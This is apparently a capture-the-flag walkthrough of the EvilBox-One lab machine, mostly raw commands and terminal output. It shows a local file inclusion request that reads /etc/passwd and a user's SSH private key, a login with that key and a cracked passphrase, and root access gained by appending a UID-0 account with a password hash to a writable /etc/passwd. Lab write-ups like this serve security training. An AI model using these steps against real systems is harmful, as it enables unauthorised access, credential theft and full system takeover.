参考资料：  
[https://medium.com/@Inching-Towards-Intelligence/pg-play-evilbox-one-89-100-cb8f495528db](https://medium.com/@Inching-Towards-Intelligence/pg-play-evilbox-one-89-100-cb8f495528db)
   

[http://192.168.53.212/secret/evil.php?command=/etc/passwd](http://192.168.53.212/secret/evil.php?command=/etc/passwd)
 
[http://192.168.53.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa](http://192.168.53.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa)
   
 ???(kali?kali)-[~]  
??$ ssh -i id_rsa mowree@192.168.52.212  
The authenticity of host '192.168.52.212 (192.168.52.212)' can't be established.  
ED25519 key fingerprint is SHA256:0x3tf1iiGyqlMEM47ZSWSJ4hLBu7FeVaeaT2FxM7iq8.  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '192.168.52.212' (ED25519) to the list of known hosts.  
Enter passphrase for key 'id_rsa':  
Enter passphrase for key 'id_rsa':  
Enter passphrase for key 'id_rsa': unicorn  
Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64  
mowree@EvilBoxOne:~$ ls  
local.txt  
mowree@EvilBoxOne:~$ cat local.txt  
bf70fbc8d604a3b66357adc9846c964a  
mowree@EvilBoxOne:~$
 
mowree@EvilBoxOne:~$ openssl passwd fake  
mowree@EvilBoxOne:~$ echo "root2:nypzT0GRtIljA:0:0:root:/root:/bin/bash" \>\> /etc/passwd  
mowree@EvilBoxOne:~$ su root2  
Contraseña:  
root@EvilBoxOne:/home/mowree# cd /root  
root@EvilBoxOne:~# lks  
bash: lks: orden no encontrada  
root@EvilBoxOne:~# ls  
proof.txt  
root@EvilBoxOne:~# cat proof.txt  
c98181b8fcdfedcfe4dae5b4e2c871d0  
root@EvilBoxOne:~#